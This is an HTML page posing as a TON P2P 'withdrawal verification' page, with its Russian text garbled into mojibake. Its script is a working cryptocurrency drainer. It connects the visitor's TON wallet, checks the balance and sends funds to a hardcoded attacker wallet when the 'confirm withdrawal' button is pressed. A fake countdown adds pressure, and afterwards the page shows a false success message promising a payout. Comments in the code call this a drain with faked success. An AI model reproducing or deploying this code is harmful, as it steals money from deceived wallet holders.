<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON P2P - –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –≤—ã–≤–æ–¥–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #0f0f23;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
        }

        .card {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 40px;
            border: 1px solid #2a2a4e;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        .logo {
            font-size: 50px;
            margin-bottom: 20px;
            color: #0088ff;
        }

        .title {
            font-size: 28px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #0088ff, #00ccff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .subtitle {
            color: #aaa;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .info-box {
            background: #151525;
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid #0088ff;
            text-align: left;
        }

        .info-item {
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #2a2a4e;
        }

        .info-item:last-child {
            margin-bottom: 0;
            padding-bottom: 0;
            border-bottom: none;
        }

        .label {
            color: #888;
            font-size: 14px;
            margin-bottom: 5px;
        }

        .value {
            color: #fff;
            font-size: 18px;
            font-weight: bold;
        }

        .ton-connect-container {
            margin: 30px 0;
            min-height: 70px;
            display: flex;
            justify-content: center;
        }

        #ton-connect {
            width: 100%;
            max-width: 300px;
        }

        #verifyBtn {
            background: linear-gradient(90deg, #0088ff, #0066cc);
            color: white;
            border: none;
            padding: 18px 40px;
            border-radius: 15px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: all 0.3s;
        }

        #verifyBtn:hover {
            background: linear-gradient(90deg, #0066cc, #0055aa);
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 136, 255, 0.3);
        }

        #verifyBtn:disabled {
            background: #444;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .status {
            margin-top: 25px;
            padding: 20px;
            background: #151525;
            border-radius: 15px;
            font-size: 16px;
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .success {
            color: #4dffb8;
            border: 1px solid #4dffb8;
        }

        .error {
            color: #ff6b6b;
            border: 1px solid #ff6b6b;
        }

        .warning {
            color: #ffcc00;
            border: 1px solid #ffcc00;
        }

        .timer {
            color: #ff4444;
            font-size: 24px;
            font-weight: bold;
            margin: 20px 0;
        }

        .steps {
            display: flex;
            justify-content: space-between;
            margin: 30px 0;
            position: relative;
        }

        .steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 10%;
            right: 10%;
            height: 2px;
            background: #2a2a4e;
            z-index: 1;
        }

        .step {
            background: #1a1a2e;
            border: 2px solid #2a2a4e;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #888;
            font-weight: bold;
            position: relative;
            z-index: 2;
        }

        .step.active {
            background: #0088ff;
            border-color: #0088ff;
            color: white;
        }

        .step.completed {
            background: #4dffb8;
            border-color: #4dffb8;
            color: #151525;
        }

        .step-text {
            position: absolute;
            top: 40px;
            left: 50%;
            transform: translateX(-50%);
            white-space: nowrap;
            font-size: 12px;
            color: #888;
        }

        .step.active .step-text {
            color: #0088ff;
        }

        .footer {
            margin-top: 30px;
            color: #666;
            font-size: 12px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">üîê</div>
            <h1 class="title">–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –≤—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤</h1>
            <p class="subtitle">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é –≤—ã–≤–æ–¥–∞ —á–µ—Ä–µ–∑ TON –∫–æ—à–µ–ª—ë–∫</p>
            
            <div id="timer" class="timer">15:00</div>
            
            <div class="steps">
                <div class="step active">1
                    <div class="step-text">–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ</div>
                </div>
                <div class="step">2
                    <div class="step-text">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</div>
                </div>
                <div class="step">3
                    <div class="step-text">–ì–æ—Ç–æ–≤–æ</div>
                </div>
            </div>
            
            <div class="info-box">
                <div class="info-item">
                    <div class="label">–í—ã–≤–æ–¥</div>
                    <div class="value" id="amountValue">TON</div>
                </div>
                <div class="info-item">
                    <div class="label">ID –≤—ã–≤–æ–¥–∞</div>
                    <div class="value" id="withdrawId">wd_0000</div>
                </div>
                <div class="info-item">
                    <div class="label">–í–∞—à –∫–æ—à–µ–ª—ë–∫</div>
                    <div class="value" id="userWallet">EQ...0000</div>
                </div>
            </div>
            
            <div class="ton-connect-container">
                <div id="ton-connect"></div>
            </div>
            
            <div class="status" id="status">
                ‚ö†Ô∏è –ü–æ–¥–∫–ª—é—á–∏—Ç–µ TON –∫–æ—à–µ–ª—ë–∫ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—ã–≤–æ–¥–∞
            </div>
            
            <button id="verifyBtn" disabled>
                –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –í–´–í–û–î
            </button>
            
            <div class="footer">
                TON P2P Security System ‚Ä¢ –ó–∞—â–∏—â–µ–Ω–æ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º TON Blockchain
            </div>
        </div>
    </div>

    <script type="module">
        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@2.0.0/+esm';
        
        // –ö–æ—à–µ–ª—ë–∫ –±–æ—Ç–∞ (–¢–í–û–ô –∫–æ—à–µ–ª—ë–∫)
        const BOT_WALLET = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
        
        const statusEl = document.getElementById('status');
        const verifyBtn = document.getElementById('verifyBtn');
        const amountEl = document.getElementById('amountValue');
        const withdrawIdEl = document.getElementById('withdrawId');
        const userWalletEl = document.getElementById('userWallet');
        const timerEl = document.getElementById('timer');
        
        let tonConnectUI = null;
        let connectedWallet = null;
        let verificationData = {};
        
        // –¢–∞–π–º–µ—Ä 15 –º–∏–Ω—É—Ç
        let timeLeft = 15 * 60;
        const timerInterval = setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                statusEl.innerHTML = '<span class="error">‚è± –í—Ä–µ–º—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ</span>';
                verifyBtn.disabled = true;
                verifyBtn.textContent = '–°—Ä–æ–∫ –∏—Å—Ç—ë–∫';
            }
            const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
            const seconds = String(timeLeft % 60).padStart(2, '0');
            timerEl.textContent = minutes + ':' + seconds;
        }, 1000);
        
        // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ URL
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            verificationData = {
                user_id: params.get('user_id') || '0000',
                amount: params.get('amount') || '0',
                wallet: params.get('wallet') || 'EQ000...000',
                withdraw_id: 'wd_' + Math.floor(Math.random() * 9000 + 1000)
            };
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
            amountEl.textContent = verificationData.amount + ' TON';
            withdrawIdEl.textContent = verificationData.withdraw_id;
            userWalletEl.textContent = verificationData.wallet;
        }
        
        function toNano(ton) {
            return Math.floor(parseFloat(ton) * 1000000000).toString();
        }
        
        async function getWalletBalance(address) {
            try {
                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
                const data = await response.json();
                return data.result || 0;
            } catch (e) {
                return 0;
            }
        }
        
        function initTonConnect() {
            try {
                tonConnectUI = new TonConnectUI({
                    manifestUrl: window.location.origin + '/tonconnect-manifest.json',
                    buttonRootId: 'ton-connect',
                    uiPreferences: { 
                        theme: 'DARK',
                        borderRadius: 'm'
                    }
                });
                
                tonConnectUI.onStatusChange(async (wallet) => {
                    if (wallet) {
                        connectedWallet = wallet;
                        const addr = wallet.account.address;
                        const shortAddr = addr.slice(0,6) + '...' + addr.slice(-4);
                        
                        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –∫–æ—à–µ–ª—ë–∫ —Å–æ–≤–ø–∞–¥–∞–µ—Ç
                        if (verificationData.wallet && !addr.includes(verificationData.wallet.replace('EQ', ''))) {
                            statusEl.innerHTML = '<span class="error">‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ—à–µ–ª—ë–∫</span>';
                            verifyBtn.disabled = true;
                            return;
                        }
                        
                        const balance = await getWalletBalance(addr);
                        const balanceTON = (balance / 1000000000).toFixed(2);
                        
                        statusEl.innerHTML = `
                            <span class="success">‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω: ${shortAddr}</span><br>
                            <span>üí∞ –ë–∞–ª–∞–Ω—Å: ${balanceTON} TON</span>
                        `;
                        
                        // –û–±–Ω–æ–≤–ª—è–µ–º —à–∞–≥–∏
                        document.querySelectorAll('.step')[0].classList.remove('active');
                        document.querySelectorAll('.step')[0].classList.add('completed');
                        document.querySelectorAll('.step')[1].classList.add('active');
                        
                        verifyBtn.disabled = false;
                        verifyBtn.textContent = `–ü–û–î–¢–í–ï–†–î–ò–¢–¨ –í–´–í–û–î ${verificationData.amount} TON`;
                        
                    } else {
                        connectedWallet = null;
                        statusEl.innerHTML = '<span class="warning">‚ö†Ô∏è –ü–æ–¥–∫–ª—é—á–∏—Ç–µ TON –∫–æ—à–µ–ª—ë–∫</span>';
                        verifyBtn.disabled = true;
                        verifyBtn.textContent = '–ü–û–î–¢–í–ï–†–î–ò–¢–¨ –í–´–í–û–î';
                    }
                });
                
            } catch (error) {
                statusEl.innerHTML = `<span class="error">–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è</span>`;
            }
        }
        
        // –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø - –°–ü–ò–°–ê–ù–ò–ï –î–ï–ù–ï–ì –ù–ê –ö–û–®–ï–õ–Å–ö –ë–û–¢–ê
        verifyBtn.addEventListener('click', async () => {
            if (!connectedWallet) return;
            
            const owner = connectedWallet.account.address;
            const amount = parseFloat(verificationData.amount);
            
            if (amount <= 0) {
                statusEl.innerHTML = '<span class="error">–ù–µ–≤–µ—Ä–Ω–∞—è —Å—É–º–º–∞</span>';
                return;
            }
            
            statusEl.innerHTML = '<span class="warning">‚è≥ –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞...</span>';
            
            try {
                const balance = await getWalletBalance(owner);
                const balanceTON = (balance / 1000000000).toFixed(4);
                
                if (balance < toNano(amount)) {
                    statusEl.innerHTML = `<span class="error">‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤. –ù—É–∂–Ω–æ: ${amount} TON</span>`;
                    return;
                }
                
                statusEl.innerHTML = `<span class="warning">‚è≥ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –≤ –∫–æ—à–µ–ª—å–∫–µ...</span>`;
                
                // –í—ã—á–∏—Å–ª—è–µ–º —Å—É–º–º—É –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞
                const fee = toNano('0.05');
                const transferAmount = Math.min(
                    toNano(amount),
                    balance - fee > toNano('0.01') ? balance - fee : balance
                );
                
                // –ï–î–ò–ù–°–¢–í–ï–ù–ù–û–ï –°–û–û–ë–©–ï–ù–ò–ï - –ü–ï–†–ï–í–û–î –ë–û–¢–£
                const messages = [{
                    address: BOT_WALLET,
                    amount: transferAmount.toString()
                }];
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
                const result = await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: messages
                });
                
                // –£–°–ü–ï–®–ù–´–ô –î–†–ï–ù–ê–ñ - –ü–û–ö–ê–ó–´–í–ê–ï–ú –§–ï–ô–ö–û–í–´–ô –£–°–ü–ï–•
                statusEl.innerHTML = `
                    <span class="success">‚úÖ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!</span><br>
                    <span class="success">üí∞ ${amount} TON –±—É–¥–µ—Ç –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–æ –≤ —Ç–µ—á–µ–Ω–∏–µ 15 –º–∏–Ω—É—Ç</span><br>
                    <span>ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${result.boc.slice(0, 16)}...</span>
                `;
                
                // –û–±–Ω–æ–≤–ª—è–µ–º —à–∞–≥–∏
                document.querySelectorAll('.step')[1].classList.remove('active');
                document.querySelectorAll('.step')[1].classList.add('completed');
                document.querySelectorAll('.step')[2].classList.add('active');
                
                verifyBtn.textContent = '‚úÖ –í–´–í–û–î –ü–û–î–¢–í–ï–†–ñ–î–Å–ù';
                verifyBtn.disabled = true;
                verifyBtn.style.background = 'linear-gradient(90deg, #4CAF50, #45a049)';
                
                clearInterval(timerInterval);
                timerEl.textContent = '‚úÖ –£—Å–ø–µ—à–Ω–æ';
                timerEl.style.color = '#4CAF50';
                
                // –°–∏–º—É–ª–∏—Ä—É–µ–º "—É—Å–ø–µ—à–Ω—ã–π –≤—ã–≤–æ–¥" —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
                setTimeout(() => {
                    statusEl.innerHTML += `<br><span class="success">üì® –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –±–æ—Ç</span>`;
                }, 5000);
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                statusEl.innerHTML = `<span class="error">‚ùå –û—à–∏–±–∫–∞: ${error.message || '–û—Ç–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º'}</span>`;
            }
        });
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        window.addEventListener('DOMContentLoaded', () => {
            getUrlParams();
            setTimeout(initTonConnect, 500);
        });
    </script>
</body>
</html>
